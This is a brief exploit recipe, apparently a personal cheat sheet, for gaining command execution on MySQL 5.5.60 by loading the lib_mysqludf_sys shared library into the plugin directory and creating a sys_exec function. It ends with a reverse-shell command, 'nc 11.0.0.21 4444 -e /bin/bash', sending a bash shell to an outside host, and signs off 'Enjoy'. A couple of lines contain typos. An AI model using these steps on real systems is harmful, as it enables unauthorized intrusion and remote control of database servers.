Use for mysql 5.5.60-0+deb8u1


Create a user defined funtion calling 'system'
Compile 32 or 64 depending on target.

Copy file to /tmp
reate database exploittest;
use exploittest;
create table bob(line blob);
insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
create function sys_exec returns int soname 'lib_mysqludf_sys.so';
select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');


Enjoy
